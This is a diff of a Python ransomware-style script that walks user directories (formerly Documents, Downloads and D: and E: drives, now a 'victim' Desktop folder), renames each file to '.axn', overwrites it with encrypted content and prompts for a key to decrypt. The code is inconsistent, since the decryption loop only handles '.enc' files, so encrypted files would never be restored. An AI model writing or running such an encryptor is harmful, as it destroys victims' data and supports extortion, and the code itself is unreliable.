@@ -1,100 +1,129 @@
 import os
-import denver  # Ensure 'denver.py' exists and is in the same directory
+import json
+import denver  # Ensure 'denver.py' exists in the same directory
+from datetime import datetime
+import random
+
+EXTENSIONS_FILE = "extensions.json"  # File to store original extensions
+
+def load_extensions():
+    """Load extensions from JSON file."""
+    if os.path.exists(EXTENSIONS_FILE):
+        with open(EXTENSIONS_FILE, "r") as f:
+            return json.load(f)
+    return {}
+
+def save_extensions(data):
+    """Save extensions to JSON file."""
+    with open(EXTENSIONS_FILE, "w") as f:
+        json.dump(data, f, indent=4)
+
+
 
 def change_extension(file_path, new_extension):
-    """Change file extension."""
+    """Change file extension, avoid conflicts by adding timestamp or random suffix."""
     dir_name, file_name = os.path.split(file_path)
     base, _ = os.path.splitext(file_name)
+
     new_file_name = f"{base}.{new_extension.lstrip('.')}"
     new_file_path = os.path.join(dir_name, new_file_name)
 
-    os.rename(file_path, new_file_path)  # Rename file
+    # Handle conflicts by adding a timestamp or random suffix
+    if os.path.exists(new_file_path):
+        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
+        random_suffix = random.randint(1000, 9999)
+        new_file_name = f"{base}_{timestamp}_{random_suffix}.{new_extension.lstrip('.')}"
+        new_file_path = os.path.join(dir_name, new_file_name)
+
+    os.rename(file_path, new_file_path)
     return new_file_path
 
-key = denver.gen_key()  # Generate encryption key
-original_ext = {}  # Store original extensions
+
+# Generate encryption key
+key = denver.gen_key()
+print(key)
+# Load previous extensions or initialize
+original_ext = load_extensions()
 
 # Directories to process
 directories_to_process = [
-    os.path.expanduser("~/Documents"),
-    os.path.expanduser("~/Downloads"),
-    "D:\\",
-    "E:\\",
+    os.path.join(os.path.expanduser("~"), "Desktop", "victim")
 ]
 
-# Encrypt files in all specified directories
+# Encrypt files
 for directory in directories_to_process:
     if os.path.exists(directory):
-        for root, dirs, files in os.walk(directory):
+        for root, _, files in os.walk(directory):
             print(f"📂 Current Directory: {root}")
+            
             for file in files:
                 file_path = os.path.join(root, file)
-                print(f"  📄 Processing File: {file_path}")
+                _, ext = os.path.splitext(file_path)
 
+                # Skip if already encrypted
+                if ext == ".enc":
+                    print(f"    🔒 Skipping: {file_path} (Already encrypted)")
+                    continue
+
+                # Store original extension
+                new_file_path = change_extension(file_path, "axn")
+                original_ext[new_file_path] = ext
+                save_extensions(original_ext)  # Save after each file
+
+                # Encrypt file content
                 try:
-                    _, ext = os.path.splitext(file_path)
-                    new_file_path = change_extension(file_path, "txt")  # Rename to .txt
-                    original_ext[new_file_path] = ext  # Store original extension
-
-                    with open(new_file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    with open(new_file_path, "r", encoding="utf-8", errors="ignore") as f:
                         content = f.read()
 
-                    encrypted_content, key_str = denver.encrypt(content, key)  # Encrypt data
+                    encrypted_content, _ = denver.encrypt(content, key)
 
-                    # Write encrypted content back
-                    with open(new_file_path, 'w', encoding='utf-8') as f:
+                    with open(new_file_path, "w", encoding="utf-8") as f:
                         f.write(encrypted_content)
 
                     print(f"    ✅ Encrypted: {file_path} ➝ {new_file_path}")
 
-                except (PermissionError, FileNotFoundError) as e:
-                    print(f"    ❌ Error: {e}")
                 except Exception as e:
-                    print(f"    ❌ Unexpected Error: {e}")
+                    print(f"    ❌ Error: {e}")
 
-            print("-" * 50)
-
-# Decryption Loop
+# Decryption loop
 while True:
     action = input("Enter 'd' to decrypt or 'q' to quit: ").strip().lower()
 
-    if action == 'd':
+    if action == "d":
         user_key = input("🔑 Enter Key: ").strip()
 
         for directory in directories_to_process:
             if os.path.exists(directory):
-                for root, dirs, files in os.walk(directory):
+                for root, _, files in os.walk(directory):
                     print(f"📂 Current Directory: {root}")
 
                     for file in files:
                         file_path = os.path.join(root, file)
-                        print(f"  📄 Processing File: {file_path}")
+
+                        if not file_path.endswith(".enc"):
+                            continue
 
                         try:
-                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                                 encrypted_content = f.read()
 
-                            decrypted_content = denver.decrypt(encrypted_content, user_key)  # Decrypt
+                            decrypted_content = denver.decrypt(encrypted_content, user_key)
 
                             if decrypted_content is not None:
-                                with open(file_path, 'w', encoding='utf-8') as f:
+                                with open(file_path, "w", encoding="utf-8") as f:
                                     f.write(decrypted_content)
 
-                                # Restore original file extension
+                                # Restore original extension
                                 original_extension = original_ext.get(file_path, ".txt")
-                                restored_path = change_extension(file_path, original_extension.lstrip('.'))
+                                restored_path = change_extension(file_path, original_extension.lstrip("."))
 
                                 print(f"    ✅ Decrypted: {file_path} ➝ {restored_path}")
                             else:
                                 print(f"    ❌ Incorrect key. Skipping {file_path}")
 
-                        except (PermissionError, FileNotFoundError) as e:
-                            print(f"    ❌ Error: {e}")
                         except Exception as e:
-                            print(f"    ❌ Unexpected Error: {e}")
+                            print(f"    ❌ Error: {e}")
 
-                print("-" * 50)
-
-    elif action == 'q':
+    elif action == "q":
         print("👋 Exiting...")
-        break  # Exit loop
+        break
